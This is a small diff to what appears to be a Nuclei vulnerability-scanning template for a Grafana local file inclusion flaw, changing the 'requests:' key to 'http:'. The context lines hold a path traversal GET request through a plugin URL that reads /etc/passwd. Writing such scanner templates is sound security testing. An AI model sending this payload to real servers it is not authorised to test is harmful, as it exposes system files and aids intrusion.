@@ -11,7 +11,7 @@ info:
     - https://twitter.com/naglinagli/status/1468155313182416899
   tags: grafana,lfi,fuzz
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/public/plugins/{{pluginSlug}}/../../../../../../../../../../../../../../../../../../../etc/passwd"
